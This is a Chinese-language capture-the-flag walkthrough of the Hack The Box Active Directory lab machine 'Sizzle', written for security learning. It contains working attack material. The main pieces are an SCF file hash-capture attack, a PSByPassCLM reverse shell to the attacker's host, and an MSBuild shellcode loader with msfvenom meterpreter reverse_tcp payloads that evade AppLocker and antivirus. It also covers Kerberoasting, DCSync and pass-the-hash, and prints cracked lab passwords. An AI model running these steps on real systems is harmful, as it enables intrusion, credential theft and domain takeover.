## AD-Sizzle详解

### 0x00前言

本小白最近在学域渗透，决定把Hack The Box的Active Directory 101
系列域渗透靶机打完，并详细记录当中用到的工具、知识点及其背后的原理。本篇文章是该系列的第六篇，靶机名字为Sizzle，这是一台疯狂难度的靶机，其中包含了bloodhound攻击向量分析、Kerberoasting、SCF文件攻击、Responder获取Net-NTLM hash、bypassAppLocker、bypass-AV、DCSync等诸多域渗透攻击方法。

### 0x01 信息搜集

首先我们使用nmap来进行端口与服务的发现

    
    
    Nmap scan report for 10.10.10.103
    Host is up (0.24s latency).
    Not shown: 65506 filtered ports
    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           Microsoft ftpd
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | ftp-syst: 
    |_  SYST: Windows_NT
    53/tcp    open  domain?
    | fingerprint-strings: 
    |   DNSVersionBindReqTCP: 
    |     version
    |_    bind
    80/tcp    open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Site doesn't have a title (text/html).
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    |_ssl-date: 2022-10-31T09:07:41+00:00; -4s from scanner time.
    443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
    |_http-title: Site doesn't have a title (text/html).
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    |_ssl-date: 2022-10-31T09:07:37+00:00; -5s from scanner time.
    | tls-alpn: 
    |   h2
    |_  http/1.1
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    |_ssl-date: 2022-10-31T09:07:42+00:00; -3s from scanner time.
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    |_ssl-date: 2022-10-31T09:07:41+00:00; -4s from scanner time.
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    |_ssl-date: 2022-10-31T09:07:38+00:00; -6s from scanner time.
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
    | Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
    | Not valid before: 2018-07-02T20:26:23
    |_Not valid after:  2019-07-02T20:26:23
    |_ssl-date: 2022-10-31T09:07:37+00:00; -6s from scanner time.
    | tls-alpn: 
    |   h2
    |_  http/1.1
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49668/tcp open  msrpc         Microsoft Windows RPC
    49669/tcp open  msrpc         Microsoft Windows RPC
    49675/tcp open  msrpc         Microsoft Windows RPC
    49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49693/tcp open  msrpc         Microsoft Windows RPC
    49695/tcp open  msrpc         Microsoft Windows RPC
    49698/tcp open  msrpc         Microsoft Windows RPC
    49703/tcp open  msrpc         Microsoft Windows RPC
    49712/tcp open  msrpc         Microsoft Windows RPC
    49720/tcp open  msrpc         Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.80%I=7%D=10/31%Time=635F8F78%P=x86_64-pc-linux-gnu%r(DNS
    SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
    SF:\x04bind\0\0\x10\0\x03");
    Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: -4s, deviation: 1s, median: -4s
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2022-10-31T09:06:34
    |_  start_date: 2022-10-31T08:48:35
    

**80端口信息搜集**

访问了80端口，发现只有一个图片

![图片.png](https://image.3001.net/images/20221102/1667388844_636255ac36c137804e02c.png!small)

发现了一个有意思的路径certsrv，因为状态码是 401（这意味着我们是未授权的，通常必须有 HTTP 身份验证）。

访问一下，可以看到这里是一个登录页面，暂且先放着

![图片.png](https://image.3001.net/images/20221102/1667388855_636255b7d7c75143dc259.png!small)

 **21端口信息搜集**

由于前面nmap的结果显示我们匿名登录ftp，所以我们来看一下

    
    
    ftp 10.10.10.103
    

![图片.png](https://image.3001.net/images/20221102/1667388868_636255c45c46a63e8792f.png!small)

FTP 上没什么有用的信息。

 **139 &445端口信息搜集**

尝试通过空会话访问SMB共享

    
    
    smbclient -N -L \\\\10.10.10.103
    

![图片.png](https://image.3001.net/images/20221102/1667388878_636255ce340beecc3a9a3.png!small)

除了上图中的一些尝试，我还尝试访问了其他的目录，结果只有Department Shares Disk目录是被允许访问的

    
    
    smbclient //10.10.10.103/"Department Shares" -U ""
    

![图片.png](https://image.3001.net/images/20221102/1667388887_636255d78a8524a64ee82.png!small)

接下来，为了方便，我选择把该目录挂载到本地，然后在本地访问它

    
    
    mount -t cifs "//10.10.10.103/Department Shares" /mnt
    
    
    
    #批量检查,我们可以在那些地方进行写操作。
    find . -type d | while read directory; 
    do touch ${directory}/ncxw 2>/dev/null && echo "${directory} - write file" && rm ${directory}/ncxw;
    mkdir ${directory}/ncxw 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/ncxw;
    done
    

![图片.png](https://image.3001.net/images/20221102/1667388898_636255e2e6ca9b6dba681.png!small)

我想测试我可以写什么样的文件，所以我在系统上可以进行写操作的两个地方创建了一堆不同的文件：

    
    
    #检查我们可以在这两个目录下写入那些类型的文件
    touch {/mnt/ZZ_ARCHIVE/,./}ncxw.{lnk,exe,dll,ini,scf}     #可以根据需要测试相应的文件类型
    

### 0x02 SCF文件攻击

    
    
    知识补充：SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，然而，SCF 文件可用于访问渗透测试人员构建特定 UNC 路径用于攻击。下面的代码可以放在一个SCF文件中，然后将其植入网络共享中。该文件在用户浏览文件所在目录时被执行，系统将通过smb协议向渗透测试人员构建的特定 UNC 路径发起Net-NTLM身份验证请求，此时的请求中包含该用户的Net-NTLM hash，攻击者使用responder即可捕获该用户的Net-NTLM  hash。
    关于该知识点的详细内容，我建议阅读这篇文章：https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
    关于Net-NTLM hash的一些利用方法，我建议阅读这篇文章：https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html
    

过了一段时间我发现存在交互行为，我们public目录下的文件会被定时删除，于是我们尝试在public目录下写入一个scf文件，内容如下：

![图片.png](https://image.3001.net/images/20221102/1667388912_636255f0b3722ff25a305.png!small)

然后我们将运行`responder`开启监听。每当用户浏览该目录时，他都会自动尝试通过smb协议发起Net-NTLM身份验证请求，如果我们开启了监听，我们将能够捕获到该用户的Net-NTLM hash

    
    
    python Responder.py -I tun0
    

![图片.png](https://image.3001.net/images/20221102/1667388920_636255f8dd4616365c8cc.png!small)

![图片.png](https://image.3001.net/images/20221102/1667388928_636256009df0ef9949757.png!small)

### 0x03 Net-NTLMv2 hash破解

将获得的Net-NTLMv2 hash保存到amanda.txt文件中，然后使用hashcat破解

    
    
    cat  amanda.txt
    

![图片.png](https://image.3001.net/images/20221102/1667388941_6362560d0ec08a488ee3b.png!small)

    
    
    hashcat -m 5600 amanda.txt /usr/share/wordlists/rockyou.txt --force
    

![图片.png](https://image.3001.net/images/20221102/1667388948_63625614906f10515bed8.png!small)

### 0x04 Bloodhound攻击向量分析

尝试通过bloodhound进行信息搜集，我们可以看到amanda和mrlky用户是属于REMOTE MANAGEMENT
USERS组的，这意味着它们是可以通过执行PS Remoting远程登录的（它在端口 5985HTTP 或 5986HTTPS
上运行）。但当我尝试通过登录，`evil-winrm`但它出错了。

    
    
    python bloodhound.py -c all -u amanda -p 'Ashare1972' -d htb.local -ns 10.10.10.103
    

![图片.png](https://image.3001.net/images/20221102/1667388961_63625621f1e9ade12dd55.png!small)

![图片.png](https://image.3001.net/images/20221102/1667388968_636256283300b454a4db4.png!small)

并且发现，MRLKY用户可以对域控发起DCsync攻击

### 0x05 通过获取的证书实现WinRM登录

![图片.png](https://image.3001.net/images/20221102/1667388979_636256330cf5ab5c9bc80.png!small)

由于现在没有其他线索，我决定返回前面发现的`/certsrv`登录页并使用`amanda’s`密码进行登录，这个网页将允许我生成一个证书，我可以用它来作为
amanda 进行身份验证。

![图片.png](https://image.3001.net/images/20221102/1667388995_63625643e18629d325a15.png!small)

我将创建自己的证书签名请求 (csr) 和密钥，然后将该 CSR 提交给服务器，它会给我一个证书。 首先，我将使用 `openssl`创建 CSR 和密钥：

    
    
    openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
    

![图片.png](https://image.3001.net/images/20221102/1667389007_6362564f9b51fda36f28c.png!small)

然后按照如下步骤提交我们的证书请求，即可获得一个下载证书的链接：

![图片.png](https://image.3001.net/images/20221102/1667389013_63625655275f55b8be7e5.png!small)

![图片.png](https://image.3001.net/images/20221102/1667389017_6362565959d6504228ad3.png!small)

![图片.png](https://image.3001.net/images/20221102/1667389023_6362565f8b332d3ef3d0e.png!small)

![图片.png](https://image.3001.net/images/20221102/1667389029_63625665bd7ed36e8f22c.png!small)

将该证书下载下来并重命名为certnew.crt 有了证书和密钥，我现在可以使用 WinRM 以 amanda
身份进行身份验证。通过以下脚本我们看到如果连接通过 ssl，我还有其他选项，包括 `:client_cert`, `:client_key`， 和
`:key_pass`. 我会用那些，而不是 `user`和 `password`字段。 我还将设置端点，确保在端口 5986 上使用 https
连接（而不是在 5985 上使用 http），因为密钥身份验证仅在安全连接上可用：

    
    
    require 'winrm'
    
    # Author: Alamot
    #https://github.com/WinRb/WinRM#ssl
    
    conn = WinRM::Connection.new(
      endpoint: 'https://10.10.10.103:5986/wsman',
      transport: :ssl,
      client_cert: 'certnew.crt',
      client_key: 'amanda.key',
      key_pass: '',
      :no_ssl_peer_verification => true
    )
    
    command=""
    
    conn.shell(:powershell) do |shell|
        until command == "exit\n" do
            output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
            print(output.output.chomp)
            command = gets
            output = shell.run(command) do |stdout, stderr|
                STDOUT.print stdout
                STDERR.print stderr
            end
        end
        puts "Exiting with code #{output.exitcode}"
    end
    
    
    
    ruby winrm
    

![图片.png](https://image.3001.net/images/20221102/1667389050_6362567a19087247dc3c8.png!small)  
通过上图我们可以看到，我们已经成功获得了一个shell，但是我并没有在amanda的桌面找到flag标志

或者我们也可以使用evil-winrm登录

    
    
    evil-winrm -c certnew.crt -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S
    

![图片.png](https://image.3001.net/images/20221102/1667389057_63625681aa0fbd20297bf.png!small)

    
    
    GetUserSPNs.py -request -dc-ip 10.10.10.103 htb.local/amanda:Ashare1972
    

![图片.png](https://image.3001.net/images/20221102/1667389065_6362568908a7262ab2214.png!small)

按理来说，用这个GetUserSPNs.py脚本是可以直接获取到该服务用户sizzle的TGS票据的，但是这里报错了，不过现在我们知道
`mrlky`被设置了SPN（通过bloodhound也可以发现这一点），我可以尝试对该帐户进行 Kerberoasting

于是我尝试进行文件上传，先用了Evil-WinRM自带的文件上传功能，发现失败了

![图片.png](https://image.3001.net/images/20221102/1667389071_6362568fedd264e6c5762.png!small)

又继续尝试使用如下图所示的方式上传，发现还是拒绝，仔细阅读了一下报错，Google搜索了一波，发现我们可能是处于 PowerShell 约束语言模式

![图片.png](https://image.3001.net/images/20221102/1667389180_636256fc1b9c13cf90426.png!small)

用以下命令可以检查当前powershell的模式，不出所料，果然是 PowerShell 约束语言模式

    
    
    $executioncontext.sessionstate.languagemode
    

![图片.png](https://image.3001.net/images/20221102/1667389189_6362570585007e02d8800.png!small)

此时我们得到的是一个低权限 PS 控制台，并且改用 PowerShell Version 2 引擎也无法摆脱这种情况，由于 AppLocker 将
PowerShell 以约束模式运行，攻击者无法将 PowerShell
语言模式更改为完整模式以运行攻击工具，无法使用核心语言功能（例如，在内存中加载脚本等等......）是很难受的一件事情。

### 0x06 BypassCLM

对于这种情况，[PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM)是突破powershell约束语言模式的好方法

    
    
    root@kali2020:~#evil-winrm -c certnew.crt -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S
    root@kali2020:~#nc -lnvp 5555
    
    *Evil-WinRM* PS C:\Users\amanda\Documents>cd \users\amanda\appdata\local\temp\
    *Evil-WinRM* PS C:\users\amanda\appdata\local\temp>iwr -uri  http://10.10.16.10/PsBypassCLM.exe -outfile PsBypassCLM.exe
    *Evil-WinRM* PS C:\users\amanda\appdata\local\temp>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.16.10 /rport=5555 \users\amanda\appdata\local\temp\PsBypassCLM.exe
    

![图片.png](https://image.3001.net/images/20221102/1667389211_6362571b621e748a41583.png!small)

    
    
    $executioncontext.sessionstate.languagemode
    

![图片.png](https://image.3001.net/images/20221102/1667389218_63625722bccebaaa0c276.png!small)

现在我们已经成功bypass了AppLocker中的PSCLM限制，但是令人难受的是Invoke-Kerberoast.ps1仍然使用，我尝试运行rubeus.exe，发现被组策略拦了，不过APPlocker容易bypass，问题不是很大，我又尝试获取一个反向shell发现被anti-virus拦截了，接下来需要bypassAV

### 0x07 Bypass-AV&&APPLocker

    
    
    知识补充：Microsoft 在 .NET 框架内发布了许多能够编译和执行代码的二进制文件。 最初引入 MSBuild 是为了使开发人员能够在未安装 Visual Studio 的环境中构建产品。 具体来说，这个二进制文件可以编译 XML C# 项目文件，因为它有一个名为 Tasks ，可以执行以托管代码编写的任务。 但是，由于此方法可以获取代码，并且 MSBuild 是可以执行此代码的受信任的 Microsoft 二进制文件，因此攻击者可能会滥用它来绕过 AppLocker 和其他应用程序白名单解决方案（如 Device Guard）。
    推荐阅读文章：https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/   #该文章末尾推荐的文章也是非常好的文章
    

![图片.png](https://image.3001.net/images/20221102/1667389234_636257328cbed79ef336b.png!small)

    
    
    msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=6666 -f csharp
    

![图片.png](https://image.3001.net/images/20221102/1667389241_636257390754b575a8e23.png!small)

上面的 shellcode 需要添加到该 [XML 文件 ](https://github.com/3gstudent/msbuild-inline-task/blob/master/executes shellcode.xml)中，这个文件里面就是接下来通过 MSBuild 编译和运行的代码。

    
    
    <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
      <!-- This inline task executes shellcode. -->
      <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
      <!-- Save This File And Execute The Above Command -->
      <!-- Author: Casey Smith, Twitter: @subTee --> 
      <!-- License: BSD 3-Clause -->
      <Target Name="Hello">
        <ClassExample />
      </Target>
      <UsingTask
        TaskName="ClassExample"
        TaskFactory="CodeTaskFactory"
        AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
        <Task>
    
          <Code Type="Class" Language="cs">
          <![CDATA[
            using System;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            public class ClassExample :  Task, ITask
            {
              private static UInt32 MEM_COMMIT = 0x1000;
              private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
              [DllImport("kernel32")]
                private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
                UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
              [DllImport("kernel32")]
                private static extern IntPtr CreateThread(
                UInt32 lpThreadAttributes,
                UInt32 dwStackSize,
                UInt32 lpStartAddress,
                IntPtr param,
                UInt32 dwCreationFlags,
                ref UInt32 lpThreadId
                );
              [DllImport("kernel32")]
                private static extern UInt32 WaitForSingleObject(
                IntPtr hHandle,
                UInt32 dwMilliseconds
                );
              public override bool Execute()
              {
                byte[] shellcode = new byte[195] {
                  0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
                  0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
                  0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
                  0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
                  0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                  0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
                  0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
                  0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
                  0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
                  0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
                  0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 };
    
                  UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                  Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                  IntPtr hThread = IntPtr.Zero;
                  UInt32 threadId = 0;
                  IntPtr pinfo = IntPtr.Zero;
                  hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                  WaitForSingleObject(hThread, 0xFFFFFFFF);
                  return true;
              } 
            }
          ]]>
          </Code>
        </Task>
      </UsingTask>
    </Project>
    
    
    
    iwr -uri  http://10.10.16.10/shellcode.xml -outfile shellcode.xml       #将shellcode.xml上传给目标机器
    C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\amanda\Documents\shellcode.xml
    

![图片.png](https://image.3001.net/images/20221102/1667389260_6362574c6788f662b6bd3.png!small)

被AV杀了，尝试加一个编码器并进行100次迭代，并将生成的shellcode按照前面的方法加到xml文件中，并命名为shellcode01.xml

    
    
    msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=6666 -e x86/shikata_ga_nai -i 100 -f csharp
    
    
    
    iwr -uri  http://10.10.16.10/shellcode01.xml -outfile shellcode01.xml
    

![图片.png](https://image.3001.net/images/20221102/1667389267_636257539e291dc90291d.png!small)

    
    
    C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\amanda\Documents\shellcode01.xml
    

![图片.png](https://image.3001.net/images/20221102/1667389274_6362575a2027f98ba8ae4.png!small)

### 0x08 Kerberoasting

    
    
    vim /etc/proxychains.conf    #配置一个socks5的代理 127.0.0.1 1080
    

然后我们将使用auxiliary/server/socks5 添加路由并设置代理：

![图片.png](https://image.3001.net/images/20221102/1667389281_63625761b8e33b81318c2.png!small)

现在我们可以尝试使用GetUserSPNs.py进行kerberoast 攻击

    
    
    proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972
    

![图片.png](https://image.3001.net/images/20221102/1667389290_6362576a3236b99a8ba3c.png!small)

通过使用GetUserSPNs.py我们知道，该服务用户是mrlky，并且我们获得了mrlky用户hash加密的TGS票据，

复制TGS保存到kali本地命名为spn-hash

![图片.png](https://image.3001.net/images/20221102/1667389303_63625777aaadf45f45c91.png!small)

    
    
    hashcat -m 13100 spn-hash /usr/share/wordlists/rockyou.txt --force
    

![图片.png](https://image.3001.net/images/20221102/1667389320_636257889eb9439c008b6.png!small)

然后我们就可以得到mrlky的明文密码：Football#7，

我们可以通过前面bloodhound的分析结果知道，mrlky用户具备对域控执行DCsync攻击的权限，接下来我可以使用secretdump.py进行DCsync攻击拿到管理员权限，这一部分我放在后面再讲，这里我再给出一种比较便捷拿到mrlky用户TGS票据的方法，请看下一部分蜜汁操作BypassAPPLocker。

如果想要获取到mrlky用户的shell，重复上面已经展示的制作证书的步骤，给mrlky制作一个证书,并将下载得到的证书命名为certnew01.crt，然后使用evil-winrm即可拿到其shell

    
    
    openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr
    evil-winrm -c certnew01.cer -k mrlky.key -i 10.10.10.103 -u mrlky -p 'Football#7' -S
    

![图片.png](https://image.3001.net/images/20221102/1667389328_63625790a696fa64fb2d0.png!small)

### 0x09 蜜汁操作BypassAPPLocker

用 [Rubeus](https://github.com/GhostPack/Rubeus)直接尝试进行Kerberoasting

    
    
    首先在kali上启一个临时的http服务
    root@kali2020:~#python -m http.server 80
    *Evil-WinRM* PS C:\Users\amanda\Documents> iwr -uri  http://10.10.16.7/Rubeus.exe -outfile rubeus.exe
    

![图片.png](https://image.3001.net/images/20221102/1667389336_63625798e6598fdca9882.png!small)

![图片.png](https://image.3001.net/images/20221102/1667389344_636257a0d25d683cfef59.png!small)

执行的时候我们发现执行不了，我这里给一个通常能够不受APPLocker中PowerShell
约束语言模式影响的路径（经过测试ps后缀的文件大都无法执行、无法执行反弹shell的exe，可能与目标上的AV有关系，其他的exe程序都没什么问题，有大佬知道原因的可以在评论区讲一下），我们接下来在该目录下测试

    
    
    C:\windows\system32\spool\drivers\color\          #蜜汁操作
    

由于我们现在拥有amanda的账号和明文密码，我可以请求http/sizzle服务的服务票证，而通过前面我们使用GetUserSPNs.py的回显结果，我们知道，该服务用户是mrlky，这样的话我们就可以获得mrlky用户hash加密的TGS票据，并对其进行Kerberoasting攻击

    
    
    .\rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
    

![图片.png](https://image.3001.net/images/20221102/1667389355_636257ab335eb7eef5f89.png!small)

现在我们拿到了mrlky用户的TGS票据，接下来的操作，上面已经展示过，这里不再赘述。

### 0x10 DCsync攻击

关于DCsync攻击的详细讲解，我在AD系列的第一篇文章AD-Forest中已经讲过，这里不再赘述，感兴趣的师傅可以去看看链接如下：

https://www.freebuf.com/articles/web/346287.html

![图片.png](https://image.3001.net/images/20221102/1667389402_636257da6b1cdb3d22484.png!small)

如下图所示，我们可以通过前面bloodhound的分析结果看到，mrlky用户具备对域控执行DCsync攻击的权限，接下来我首选的 DCSync
攻击方式是使用`secretsdump.py`，它允许我在Kali 机器执行 DCSync 攻击，前提是我可以在 TCP 445 和 135 以及高 RPC
端口上与 DC
通信。这种方式的优点是避免了与杀软的对抗，尽管它会产生一些网络流量，可能被其他审计设备捕获，但是它避免了将一些文件传输到目标机器执行操作时遭受的诸如PowerShell
约束语言模式权限限制等问题。

![图片.png](https://image.3001.net/images/20221102/1667389450_6362580ad50a92f3416b0.png!small)

    
    
    secretsdump.py 'mrlky:Football#7@10.10.10.103'
    

![图片.png](https://image.3001.net/images/20221102/1667389480_63625828304e18e7465d0.png!small)

    
    
    psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267' -dc-ip 10.10.10.103 administrator@10.10.10.103
    

![图片.png](https://image.3001.net/images/20221102/1667389496_63625838b33206ee3fb6b.png!small)

![图片.png](https://image.3001.net/images/20221102/1667389503_6362583fda25044989727.png!small)

### 0x11总结

Sizzle是一个疯狂的AD靶机，我们通过把开放的SMB共享挂载到本地，进行信息搜集的时候发现存在某种交互，于是使用SCF文件攻击，获取到了amanda用户的Net-NTLMv2hash，通过hashcat破解拿到了amanda的明文密码，结合winrm登录的报错以及之前发现的web登录页面，判断需要证书，才能远程登录，申请完证书后，通过Evil-winRM拿到了一个处于PSCLM模式的低权限shell，并且存在Anti-Virus和APPLocker限制，通过MSBuild结合msfvenom生成的马子，Bypass了AV和APPLocker得到了一个shell，通过设置socks代理的方式使用GetUserSPNs.py拿到了mrlky用户的TGS票据，通过Kerberoasting攻击拿到了该用户的明文密码，通过Bloodhound的攻击向量分析，发现该用户具备发起DCsync攻击的能力，最终通过secretdump.py进行DCsync攻击，获取到了域管理员的hash，然后通过psexec进行PTH拿到了域管shell，总之，道阻且长，行则将至，关关难过，关关过，希望大家都能变得更强！

    
    
    参考资料：    https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/
    	         https://github.com/padovah4ck/PSByPassCLM
    		     https://github.com/Cn33liz/MSBuildShell
    		     https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
       		 	 https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
    			 https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
    			 https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html
    

